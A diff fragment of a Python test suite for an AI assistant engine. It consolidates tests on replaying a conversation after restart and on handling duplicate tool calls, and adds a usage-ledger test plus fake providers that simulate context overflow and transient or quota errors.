+    conversation = restarted.recent("owner", 24)
+    assert conversation, "the conversation did not outlive the process"
+    assert conversation[-2]["content"] == "the deadline is Friday"
+    assert conversation[-1]["content"] == "Noted."
+
     provider = ScriptedProvider([ChatResult(content="ok")])
     restarted.model = ModelClient(restarted.settings, providers=[provider])
-
     await Engine(restarted).run_turn(InboundEvent(text="when is it?", user_id="owner"))
-
     sent = "\n".join(str(m.get("content")) for m in provider.calls[0])
     assert "the deadline is Friday" in sent, "the replayed conversation never reached the model"
-
-
-# -- one step, one effect ---------------------------------------------------
 
 
 def _twice(tool: str, **arguments: object) -> ChatResult:
@@ -536,13 +551,14 @@ def _twice(tool: str, **arguments: object) -> ChatResult:
 
 
 async def test_a_call_sent_twice_in_one_step_runs_once(runtime: Runtime) -> None:
-    """The model said one thing; the transport repeated it — not two reminders.
+    """A repeated call is not a repeated intent — but every id must be answered.
 
-    On 17 Oct the model emitted two byte-identical `calendar op=create` calls in
-    a single message and the engine ran both, in the same second. The owner got
-    two copies of one reminder, and the rest of the turn went on four failing
-    deletes trying to remove the twin. A repeated call is not a repeated intent.
+    On 17 Oct two byte-identical `calendar op=create` calls in one message both
+    ran, and the owner got two reminders. Each id still needs its own tool
+    message or the next request is malformed, the duplicate must be told it ran
+    once, and the duplicate is one attempt so it cannot burn a second strike.
     """
+    # case: one effect, one event, one reply.
     runtime.model = ModelClient(
         runtime.settings,
         providers=[
@@ -559,35 +575,22 @@ async def test_a_call_sent_twice_in_one_step_runs_once(runtime: Runtime) -> None
             )
         ],
     )
-
     result = await Engine(runtime).run_turn(
         InboundEvent(text="reminder for tomorrow's contest", user_id="owner")
     )
-
     assert result.text == "One reminder set."
     assert len(runtime.calendar.series()) == 1, "the repeated call created a second event"
 
-
-async def test_every_id_of_a_repeated_call_is_answered(runtime: Runtime) -> None:
-    """Each tool_call_id needs its own tool message, or the next request is malformed."""
+    # case: both ids are answered, and the duplicate is told it was a repeat.
     provider = ScriptedProvider([_twice("calendar", op="list"), ChatResult(content="Done.")])
     runtime.model = ModelClient(runtime.settings, providers=[provider])
-
     await Engine(runtime).run_turn(InboundEvent(text="what is on", user_id="owner"))
-
     sent = provider.calls[1]
     answered = [m["tool_call_id"] for m in sent if m.get("role") == "tool"]
     assert answered == ["call_1", "call_2"]
     assert "ran once" in sent[-1]["content"], "the model was not told its call was a repeat"
 
-
-async def test_a_repeated_failing_call_counts_as_one_failure(runtime: Runtime) -> None:
-    """The duplicate is the same attempt, so it cannot be the second strike.
-
-    The repeat guard counts *attempts that differ* in getting nowhere. A call the
-    model sent twice in one step is one attempt; counting it twice would let a
-    single malformed message burn a correction the model never earned.
-    """
+    # case: the doubled first step counts as one failure, not two.
     runtime.model = ModelClient(
         runtime.settings,
         providers=[
@@ -601,62 +604,89 @@ async def test_a_repeated_failing_call_counts_as_one_failure(runtime: Runtime) -
             )
         ],
     )
-
     result = await Engine(runtime).run_turn(InboundEvent(text="author something", user_id="owner"))
-
     # Three distinct failures earn the correction, the fourth ends the turn. The
     # doubled first step contributed one, so this ends at 4 steps and not 3.
     assert result.steps == 4
     assert result.error == "repeated failure"
 
 
-async def test_a_stuck_turn_asks_the_owner_rather_than_reporting_its_failure(
-    runtime: Runtime,
-) -> None:
-    """The loop's last resort is a question when the tool had one to ask.
+async def test_every_turn_leaves_a_usage_record_of_structure_only(runtime: Runtime) -> None:
+    """The ledger answers "which model is slow" without ever holding the words.
 
-    On 17 Oct the owner got *"I stopped rather than burn the rest of the turn on
-    it. Tell me what to try instead"* — while the agent was holding both events
-    and their ids, and the only thing missing was which one. That is a question,
-    not a failure, and it is the owner's to answer. The tool says so in its
-    refusal; the loop hands it up instead of an account of its own bad turn.
+    Tokens and time are recorded when reported and estimated when they are not
+    (zero would be a lie), retries and the failing entry are named so a slow
+    turn and a flaky one can be told apart, and the owner's text never enters.
     """
-    first = runtime.calendar.add(summary="LeetCode Weekly Contest 524", start="2026-10-18T08:00")
-    second = runtime.calendar.add(summary="LeetCode Weekly Contest 524", start="2026-10-18T08:00")
-    stuck = tool_call("calendar", op="delete", summary="LeetCode Weekly Contest 524")
+
+    def last_entry() -> dict[str, Any]:
+        path = runtime.settings.home / "state" / "usage.jsonl"
+        return json.loads(path.read_text(encoding="utf-8").splitlines()[-1])
+
+    # case: a reported usage block, the seat, the outcome — and no text.
     runtime.model = ModelClient(
-        runtime.settings, providers=[ScriptedProvider([stuck] * 8)],
+        runtime.settings,
+        providers=[
+            ScriptedProvider(
+                [ChatResult(content="done", usage={"prompt_tokens": 120, "completion_tokens": 8})]
+            )
+        ],
+    )
+    result = await Engine(runtime).run_turn(InboundEvent(text="just answer", user_id="owner"))
+    assert (result.tokens_in, result.tokens_out) == (120, 8)
+    assert result.seconds >= 0.0
+    entry = last_entry()
+    assert entry["seat"] == "daedalus"
+    assert entry["tokens_in"] == 120
+    assert entry["outcome"] == "ok"
+    assert "text" not in entry and "just answer" not in json.dumps(entry), (
+        "usage is structure only — never the owner's words"
     )
 
-    result = await Engine(runtime).run_turn(
-        InboundEvent(text="drop the leetcode reminder", user_id="owner")
-    )
-
-    assert result.error == "repeated failure"
-    assert "which one to remove" in result.text, "the owner was not asked what only they know"
-    assert first.uid in result.text and second.uid in result.text, (
-        "the owner cannot answer without the ids that tell the two apart"
-    )
-    assert "I got stuck" not in result.text and "The call was" not in result.text
-
-
-async def test_a_tool_with_no_question_to_ask_still_reports_being_stuck(runtime: Runtime) -> None:
-    """The old dead end stays for failures that are the agent's own.
-
-    A tool that failed without a question — here a capability authored with no
-    source — has nothing to hand the owner, so the report stays a report.
-    """
+    # case: a retry is counted and the failure it recovered from is named.
     runtime.model = ModelClient(
-        runtime.settings, providers=[ScriptedProvider([tool_call("capability", op="author")] * 8)],
+        runtime.settings,
+        providers=[Intermittent([ChatResult(content="answered", provider="flaky")])],
     )
+    result = await Engine(runtime).run_turn(InboundEvent(text="hi", user_id="owner"))
+    assert result.text == "answered"
+    assert result.retries == 1
+    entry = last_entry()
+    assert entry["retries"] == 1
+    assert entry["failure"] == "TransientProviderError 503"
+    assert entry["outcome"] == "ok"
 
-    result = await Engine(runtime).run_turn(InboundEvent(text="author something", user_id="owner"))
+    # case: a failed turn names the entry it tried, not a blank.
+    from daedalus.model.providers import QuotaExhaustedError
 
-    assert result.error == "repeated failure"
-    assert "I got stuck" in result.text
+    runtime.model = ModelClient(
+        runtime.settings,
+        providers=[
+            Intermittent(
+                [],
+                error=QuotaExhaustedError("doomed HTTP 429: insufficient_quota", status=429),
+            )
+        ],
+    )
+    result = await Engine(runtime).run_turn(InboundEvent(text="hi", user_id="owner"))
+    assert result.error
+    entry = last_entry()
+    assert entry["provider"] == "flaky", "the entry that was tried, not a blank"
+    assert entry["failure"] == "QuotaExhaustedError 429"
+    assert entry["outcome"] == "error"
+
+    # case: no reported usage means estimated tokens, recorded as such.
+    runtime.model = ModelClient(
+        runtime.settings,
+        providers=[ScriptedProvider([ChatResult(content="a short answer")])],
+    )
+    result = await Engine(runtime).run_turn(InboundEvent(text="say something", user_id="owner"))
+    assert result.tokens_in > 0
+    assert result.tokens_out > 0
+    assert last_entry()["tokens_estimated"] is True
 
 
-# -- one turn at a time ------------------------------------------------------
+# -- instruments -------------------------------------------------------------
 
 
 class _TurnRef(Tool):
@@ -697,28 +727,74 @@ def _event(channel: str) -> InboundEvent:
     return InboundEvent(text="what's up", user_id="owner", channel_id=channel)
 
 
-async def test_two_messages_never_run_as_two_turns_at_once(runtime: Runtime) -> None:
-    """One owner, one loop: a second message waits instead of racing the first.
+class OverflowsOnce:
+    """A provider that reports a context overflow at a chosen call.
 
-    On 17 Oct the owner waited ninety seconds for an answer, re-sent the same
-    message, and the second turn began while the first was still going. Both turns
-    set `ctx.session` — the ingress policy every tool reads, `local_only` included,
-    so this is a security race as much as a confusing one — and the owner was
-    answered *out of order*: the calendar reply landed after, and read from before,
-    an unrelated AI briefing that had finished in between.
-
-    Two `Engine` instances on purpose: the lock belongs to the Runtime, which is
-    also what serializes a scheduler wake against a conversation.
+    The engine can only recover if the failure is *named* as an overflow, so
+    this stands in for NIM's 400 `context_length_exceeded`.
     """
-    _TurnRef.live = _TurnRef.peak = 0
-    runtime.tools.register(_TurnRef())
-    runtime.model = ModelClient(runtime.settings, providers=[ScriptedProvider([_call_then_echo] * 8)])
 
-    first, second = await asyncio.gather(
-        Engine(runtime).run_turn(_event("chan-a")),
-        Engine(runtime).run_turn(_event("chan-b")),
-    )
+    def __init__(self, script: list[Any], *, fail_at: int = 4, always: bool = False) -> None:
+        self._script = list(script)
+        self.fail_at = fail_at
+        self.always = always
+        self.calls = 0
+        self.seen: list[list[dict[str, Any]]] = []
+        self.name = "overflowy"
+        self.model = "m"
+        self.window_s = 60
+        self.max_calls = 0
+        self.is_local = False
+        self.retries = 0
 
-    assert _TurnRef.peak == 1, "two turns ran at the same time"
-    assert "chan-a" in first.text, "the first turn was answered under the second's session"
-    assert "chan-b" in second.text, "the second turn was answered under the first's session"
+    def available(self) -> bool:
+        return True
+
+    async def complete(
+        self,
+        messages: list[dict[str, Any]],
+        tools: Any = None,
+        on_delta: Any = None,
+        temperature: float = 0.3,
+    ) -> ChatResult:
+        self.calls += 1
+        self.seen.append([dict(m) for m in messages])
+        if self.calls == self.fail_at or (self.always and self.calls > self.fail_at):
+            raise ContextOverflowError("HTTP 400: context_length_exceeded", status=400)
+        return self._script.pop(0)
+
+
+def _three_notes_and_an_answer() -> list[Any]:
+    return [
+        tool_call("memory", op="write", facet="projects", content="note one"),
+        tool_call("memory", op="write", facet="projects", content="note two"),
+        tool_call("memory", op="write", facet="projects", content="note three"),
+        ChatResult(content="Answered with less."),
+    ]
+
+
+class Intermittent:
+    """Fails once with a free retry, then answers — the flaky turn."""
+
+    def __init__(self, script: list[Any], *, error: Exception | None = None) -> None:
+        self._script = list(script)
+        self.name = "flaky"
+        self.model = "m"
+        self.window_s = 60
+        self.max_calls = 0
+        self.is_local = False
+        self.retries = 1
+        self.retry_budget_s = 10.0
+        self.calls = 0
+        self._error = error or TransientProviderError(
+            "HTTP 503: busy", status=503, retry_after=0.0
+        )
+
+    def available(self) -> bool:
+        return True
+
+    async def complete(self, messages, tools=None, on_delta=None, temperature=0.3):  # noqa: ANN001
+        self.calls += 1
+        if self.calls == 1:
+            raise self._error
+        return self._script.pop(0)
